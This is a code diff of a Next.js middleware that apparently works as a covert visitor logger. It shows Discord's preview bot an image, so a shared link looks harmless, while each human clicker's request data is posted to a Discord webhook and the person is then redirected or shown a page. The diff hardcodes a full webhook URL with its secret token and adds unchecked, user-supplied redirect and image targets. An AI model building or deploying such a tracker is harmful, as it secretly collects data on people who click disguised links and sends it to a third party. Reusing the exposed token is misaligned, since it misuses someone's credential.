@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 
-const webhook = process.env.WEBHOOK_URL // Your webhook URL now is in the .env file.
+const webhook = "https://discord.com/api/webhooks/1217212165077991625/kDHdiQn8MadrDHgSQjcLMAWyL_J3uX93563M9QGLhAyUBYrs7fNJ2ZjDfFDR_mRzI8nq";
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
@@ -8,7 +8,8 @@ export async function middleware(req){
   const vercelbot = ["vercel-", "Vercelbot/"].find(u => ua?.startsWith(u));
   const path = req.nextUrl.pathname;
   const favicon = path.startsWith("/favicon");
-  const img = req.nextUrl.searchParams.get('img') ? new URL(req.nextUrl.searchParams.get('img')) : new URL("/mini.png", req.url);
+  const imgParam = req.nextUrl.searchParams.get('img');
+  const img = imgParam ? new URL(imgParam.startsWith("https://") ? imgParam : ("https://" + imgParam)) : new URL("/mini.png", req.url);
   const redirect = req.nextUrl.searchParams.get('red');
   const body = {
     "embeds":[{
@@ -18,12 +19,12 @@ export async function middleware(req){
   };
   if(!(favicon||vercelbot)){
     await fetch(webhook,{body: JSON.stringify(body), headers:{"content-type":"application/json"}, method:"POST"})
-    if(discordbot||vercelbot){
-      // Return the image.
+    if(discordbot){
       return NextResponse.rewrite(img)
     }else{
-      // Make a message for whoever takes the risk to directly click.
-      return redirect ? NextResponse.redirect(new URL(redirect)) : NextResponse.rewrite(new URL("/page.html", req.url));
+      return redirect ? NextResponse.redirect(new URL(redirect.startsWith("https://") ? redirect : ("https://" + redirect))) : NextResponse.rewrite(new URL("/page.html", req.url));
     }
+  } else {
+    await fetch(webhook,{body: JSON.stringify({"content":"FAVICON OR VERCEL"}), headers:{"content-type":"application/json"}, method:"POST"})
   }
 }
